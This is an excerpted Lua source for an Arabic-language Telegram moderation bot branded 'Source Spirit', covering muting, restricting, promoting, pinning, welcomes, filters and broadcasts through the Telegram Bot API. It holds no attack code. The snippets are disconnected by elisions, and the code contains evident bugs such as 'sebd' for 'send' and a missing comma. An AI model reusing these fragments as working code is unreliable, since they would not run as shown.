end,nil)
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ꨄ︎ البوت ليس ادمن يرجى ترقيتي !') 
return false  
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ꨄ︎ لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
...
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
...
send(msg.chat_id_, msg.id_, '\n ꨄ︎ عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
Textt = " ꨄ︎ الحظر العام  ⇇"..GBan.."\n ꨄ︎ الكتم العام  ⇇"..Gmute.."\n ꨄ︎ الحظر  ⇇"..Ban.."\n ꨄ︎ الكتم  ⇇"..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎  الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎  الايدي  ⇇`'..result.sender_user_id_..'`\n ꨄ︎  تم رفعه مشرف '
send(msg.chat_id_, msg.id_, usertext..status)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎  الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎  الايدي  ⇇`'..result.sender_user_id_..'`\n ꨄ︎  تم تنزيله ادمن من الجروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
usertext = '\n ꨄ︎  الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ꨄ︎  تم تنزيله مشرف من الجروب بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
...
'\n❲[`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´](t.me/come_here_to_get)❳'..
'\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺'..
'\n ꨄ︎ اعدادات الجروب كتالي ☆'..
'\nء⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺'..
'\n ꨄ︎  علامة ال {✓} تعني مفعل'..
'\n ꨄ︎  علامة ال {✘} تعني معطل'..
'\nء⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺'..
'\n ꨄ︎  الروابط  ⇇{ '..lock_links..
' }\n'..' ꨄ︎  المعرفات  ⇇{ '..lock_user..
' }\n'..' ꨄ︎  التاك  ⇇{ '..lock_hash..
' }\n'..' ꨄ︎  البوتات  ⇇{ '..lock_bots..
' }\n'..' ꨄ︎  التوجيه  ⇇{ '..lock_fwd..
' }\n'..' ꨄ︎  التثبيت  ⇇{ '..lock_pin..
' }\n'..' ꨄ︎  الاشعارات  ⇇{ '..lock_tagservr..
' }\n'..' ꨄ︎  الماركدون  ⇇{ '..lock_mark..
' }\n'..' ꨄ︎  التعديل  ⇇{ '..lock_edit..
' }\n'..' ꨄ︎  تعديل الميديا  ⇇{ '..lock_edit_med..
' }\nء⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺'..
'\n'..' ꨄ︎  الكلايش  ⇇{ '..lock_spam..
' }\n'..' ꨄ︎  الكيبورد  ⇇{ '..lock_inlin..
' }\n'..' ꨄ︎  الاغاني  ⇇{ '..lock_vico..
' }\n'..' ꨄ︎  المتحركه  ⇇{ '..lock_gif..
' }\n'..' ꨄ︎  الملفات  ⇇{ '..lock_file..
' }\n'..' ꨄ︎  الدردشه  ⇇{ '..lock_text..
' }\n'..' ꨄ︎   الفيديو  ⇇{ '..lock_ved..
' }\n'..' ꨄ︎   الصور  ⇇{ '..lock_photo..
' }\nء⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺'..
'\n'..' ꨄ︎   الصوت  ⇇{ '..lock_muse..
' }\n'..' ꨄ︎  الملصقات  ⇇{ '..lock_ste..
' }\n'..' ꨄ︎  الجهات  ⇇{ '..lock_phon..
' }\n'..' ꨄ︎  الدخول  ⇇{ '..lock_join..
' }\n'..' ꨄ︎  الاضافه  ⇇{ '..lock_add..
' }\n'..' ꨄ︎  السيلفي  ⇇{ '..lock_self..
' }\n'..' ꨄ︎  الالعاب  ⇇{ '..lock_geam..
' }\n'..' ꨄ︎  التكرار  ⇇{ '..flood..
' }\n'..' ꨄ︎  الترحيب  ⇇{ '..welcome..
' }\n'..' ꨄ︎  عدد التكرار  ⇇{ '..NUM_MSG_MAX..
' }\nء⧬━┅┅┄⟞❲[᪣𝚁𝙰𝙼𝙱𝙾᪣](t.me/come_here_to_get)❳⟝┄┉┉━⧬'..
'\n ꨄ︎  علامة ال {✓} تعني مفعل'..
'\n ꨄ︎  علامة ال {✘} تعني معطل'..
'\nء⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺'..
'\n'..' ꨄ︎  امر صيح  ⇇{ '..kickme..
' }\n'..' ꨄ︎  امر اطردني  ⇇{ '..sehuser..
' }\n'..' ꨄ︎  امر منو ضافني  ⇇{ '..addme..
' }\n'..' ꨄ︎  الردود  ⇇{ '..rdmder..
' }\n'..' ꨄ︎  الردود العامه  ⇇{ '..rdsudo..
' }\n'..' ꨄ︎  الايدي  ⇇{ '..idgp..
' }\n'..' ꨄ︎  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ꨄ︎  الرفع  ⇇{ '..setadd..
' }\n'..' ꨄ︎  الحظر  ⇇{ '..banm..' }\n\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ قناةسورس سبريت⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n [ ❲[`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´](t.me/come_here_to_get)❳](t.me/come_here_to_get) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_,msg.id_," ꨄ︎ عذرآ تم قفل التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ꨄ︎ تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ꨄ︎ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ꨄ︎ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ꨄ︎ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
...
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ꨄ︎ عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء تثبيت الرساله")   
...
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء تثبيت الكل")   
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺ٴ\n 𓆩 ❲[`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´](t.me/come_here_to_get)❳ 𓆪 ')
end
...
send(msg.chat_id_,msg.id_," ꨄ︎ حسنآ ارسل اليه الرابط الان")
...
if Constructor(msg) then  
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ꨄ︎ تم تفعيل الصوره") 
return false  
end
end
...
if Constructor(msg) then  
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ꨄ︎ تم تعطيل الصوره") 
return false end
end
if text == "تفعيل نسبه جمالي" or text == 'تفعيل جمالي' then
if Constructor(msg) then  
database:set(bot_id.."pp_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ꨄ︎ تم تفعيل نسبه جمالك") 
return false  
end
end
...
if Constructor(msg) then  
database:del(bot_id.."pp_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ꨄ︎ تم تعطيل نسبه جمالك") 
return false end
end
if text == "الرابط" then 
...
if linkgpp.ok == true then 
local Teext = ' ꨄ︎ '..ta.title_..'\n'..linkgpp.result 
local inline = {{{text = ta.title_, url=linkgpp.result}},} 
send_inline_key(msg.chat_id_,Teext,nil,inline,msg.id_/2097152/0.5) 
else 
send(msg.chat_id_, msg.id_,' ꨄ︎ لا يوجد رابط ارسل ضع رابط') 
end 
end,nil) 
end
...
send(msg.chat_id_,msg.id_," ꨄ︎ تم مسح الرابط")           
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل لي الصوره') 
return false
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم ازالة صورة الجروب') 
end
return false  
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الان الوصف')
end
return false  
end
...
t  = ' ꨄ︎ ارسل لي الترحيب الان'
tt = '\n ꨄ︎ تستطيع اضافة مايلي !\n ꨄ︎ دالة عرض الاسم  ↚{`name`}\n ꨄ︎ دالة عرض المعرف  ↚{`user`}'
...
GetWelcome = ' ꨄ︎ لم يتم تعيين ترحيب للكروب'
end 
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تفعيل ترحيب الجروب') 
return false  
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعطيل ترحيب الجروب') 
return false  
end
if text == 'مسح الترحيب' or text == 'مسح الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' ꨄ︎ تم ازالة ترحيب الجروب') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_," ꨄ︎ ارسل الكلمه لمنعها")  
...
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ꨄ︎ ارسل التحذير عند ارسال الكلمه")  
...
if test == "repp" then  
send(msg.chat_id_, msg.id_," ꨄ︎ تم منع الكلمه مع التحذير")  
...
send(msg.chat_id_, msg.id_," ꨄ︎ ارسل الكلمه الان")  
database:set(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء منعها")  
database:del(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم مسح قائمه المنع")  
end
...
send(msg.chat_id_,msg.id_,' ꨄ︎ تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ꨄ︎ تم حفظ كليشة المطور')
return false
end
-----------------
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ تم ازالة كليشة الايدي')
end
return false  
end 
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء تعين الايدي") 
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعين الايدي')    
end
...
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, " ꨄ︎ لا توجد بوتات في الجروب")
else
local t = ' ꨄ︎ عدد البوتات هنا >> {'..c..'}\n ꨄ︎ عدد البوتات التي هي ادمن >> {'..x..'}\n ꨄ︎ تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
...
if #admins == i then 
local a = '\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = ' ꨄ︎ عدد البوتات التي هي ادمن >> {'..t..'}\n ꨄ︎ ملاحضه علامة ال ( ꨄ︎ ) تعني ان البوت ادمن \n'
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, " ꨄ︎ تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_," ꨄ︎ تم حفظ قوانين الجروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
...
send(msg.chat_id_,msg.id_," ꨄ︎ ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' or text == 'مسح القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_," ꨄ︎ تم ازالة قوانين الجروب")  
...
send(msg.chat_id_, msg.id_," ꨄ︎ لا توجد قوانين")   
end    
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم طرد المحذوفين')
end,nil)
end
end
...
if #list == 0 then
send(msg.chat_id_, msg.id_,' ꨄ︎ لا توجد صلاحيات مضافه')
return false
end
t = "\n ꨄ︎ قائمة الصلاحيات المضافه \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_, " ꨄ︎ ارسل نوع الرتبه \n ꨄ︎ {عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
...
send(msg.chat_id_, msg.id_, "* ꨄ︎ تم مسح الصلاحيه *\n") 
end
...
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"* ꨄ︎ تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n ꨄ︎ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"* ꨄ︎ تستطيع اضافه صلاحيات {مميز - عضو} \n ꨄ︎ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* ꨄ︎  تستطيع اضافه صلاحيات {عضو} \n ꨄ︎ ارسل الصلاحيه مجددا*\n") 
return false
end
end
...
send(msg.chat_id_, msg.id_, " ꨄ︎ تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ꨄ︎ الـعـضو   ⇇['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n ꨄ︎ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم مسح رسائلك'  )  
...
send(msg.chat_id_, msg.id_,' ꨄ︎ عدد رسائلك  ⇇{ '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
...
if num > 1500 then 
send(msg.chat_id_, msg.id_,' ꨄ︎ تستطيع التنظيف 1500 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_,msg.id_,' ꨄ︎ تم مسح {'..num..'}')  
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم تنظيف جميع الميديا")
end
...
local Message = v
if Message then
t = " ꨄ︎ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."S00F4:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = " ꨄ︎ لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
...
local numl = v
if numl then
l = " ꨄ︎ عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = " ꨄ︎ لا يوجد ميديا في المجموعه"
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تنظيف جميع الرسائل المعدله')
end
...
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ꨄ︎ ارسل لي الاسم الان ")  
end
return false
end
if msg.content_.ID == "MessageChatJoinByLink" then
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'راستي').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'راستي')
local DRAGON_Msg = {
'نعم يروحي🙈❤️',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
send(msg.chat_id_, msg.id_," الاذاعه معطله من قبل المطور الاساسي ꨄ︎ ")
return false
end
database:setex(bot_id.."Ss:Cs" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"ꨄ︎ ارسل لي سواء ~ { ملصق, متحركه, صوره, رساله }\nꨄ︎ للخروج ارسل الغاء ") 
return false
end 
...
send(msg.chat_id_, msg.id_,"ꨄ︎ تمت الاذاعه الى المشتركين والمجموعات ") 
database:del(bot_id.."Ss:Cs" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
send(msg.chat_id_, msg.id_,' ꨄ︎ الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ꨄ︎ ليست لدي صلاحية تغير اسم الجروب")  
else
sebd(msg.chat_id_,msg.id_,' ꨄ︎ تم تغيير اسم الجروب الى {[↝'..Name..'↜]}')  
end
end,nil) 
end
...
send(msg.chat_id_, msg.id_,"\n ꨄ︎ تم تنزيل الشخص من الرتب التاليه \n ꨄ︎  { "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n ꨄ︎  عذرا الـعـضو  لايملك رتبه \n")
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم مسح الردود العامه")
end

if text == ("الردود العامه") and DevSoFi(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ꨄ︎ قائمة الردود العامه \n⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃?? 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd↝'..msg.sender_user_id_..'↜:'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الرد الذي تريد اضافته')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم ازالة الرد العام')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الكلمه تريد اضافتها')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الكلمه تريد مسحها')
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم مسح الرد من ردود المتعدده")
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم مسح الردود")
end

if text == ("الردود") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
text = " ꨄ︎ قائمه الردود \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم ازالة الرد ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الكلمه التي تريد اضافتها')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل الكلمه التي تريد مسحها')
...
send(msg.chat_id_, msg.id_,' ꨄ︎ لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n ꨄ︎ قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..') '
status  = '\n ꨄ︎ الايدي  ⇇'..result.sender_user_id_..'\n ꨄ︎ تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
...
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ꨄ︎ البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꨄ︎  الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎  الايدي  ⇇`'..result.sender_user_id_..'`\n ꨄ︎  تم مسح لقبه من الجروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ وينك وين القب ') 
else
send(msg.chat_id_, msg.id_,' ꨄ︎ لقبك هو : '..GeId.result.custom_title) 
end
end
...
send(msg.chat_id_, msg.id_,'\n ꨄ︎ صلاحيات البوت هي\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎  علامة ال {✔️} تعني مفعل\n ꨄ︎  علامة ال {✖} تعني غير مفعل\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ تغير معلومات المجموعة ↞ '..INf..'\n ꨄ︎ مسح الرسائل ↞ '..DEL..'\n ꨄ︎ حظر المستخدمين ↞ '..REs..'\n ꨄ︎ دعوة المستخدمين ↞ '..INv..'\n ꨄ︎ ثتبيت الرسالة ↞ '..Pin..'\n ꨄ︎ اضافة مشرفين ↞ '..PRo)   
end
end
...
end --الكود حصريسورس سبريتيعني لو بكتهن راح اعرفك انت الاخذتهن
local t = "\n ꨄ︎ المستخدم ~ ["..User_id .."] يصيح المشرفين \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
k = 0
...
return send(msg.chat_id_, msg.id_," ꨄ︎ ارسل الرد الذي اريد اضافته")
end
...
return send(msg.chat_id_, msg.id_," ꨄ︎ ارسل الان الكلمه لمسحها ")
end
if text then  
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," ꨄ︎ تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'راستي').." غادر" or text == 'غادر' then  
...
Text = ' ꨄ︎ تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = ' ꨄ︎ بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and DevSoFi(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' ꨄ︎ تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = ' ꨄ︎ بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end
...
Text = '\n ꨄ︎ تم تفعيل الردود العامه' 
else
Text = '\n ꨄ︎ بالتاكيد تم تفعيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n ꨄ︎ تم تعطيل الردود العامه' 
else
Text = '\n ꨄ︎ بالتاكيد تم تعطيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
Text = '\n ꨄ︎ تم تفعيل الايدي بالصور' 
else
Text = '\n ꨄ︎ بالتاكيد تم تفعيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
Text = '\n ꨄ︎ تم تعطيل الايدي بالصوره' 
else
Text = '\n ꨄ︎ بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ ايديه ⇜ '..iduser..'\n ꨄ︎ معرفه ⇜ ↝'..username..'↜\n ꨄ︎ رتبته ⇜ '..rtp..'\n ꨄ︎ تعديلاته ⇜ '..edit..'\n ꨄ︎ نقاسبريت⇜ '..NUMPGAME..'\n ꨄ︎ جهاته ⇜ '..Contact..'\n ꨄ︎ رسائله ⇜ ↝'..Msguser..'↜')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
...
if not my_ph then
send(msg.chat_id_, msg.id_," ꨄ︎ انا مين معطله") 
return false  
end
local msg_id = msg.id_/2097152/0.5  
local textt = '['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](t.me/come_here_to_get)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
send(msg.chat_id_, msg.id_," ꨄ︎ تـم تـفعـيل انا مين") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تـم تـعـطـيل انا مين") 
return false end
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تـم تـفعـيل ردود السورس") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تـم تـعـطـيل ردود السورس") 
return false end
end
...
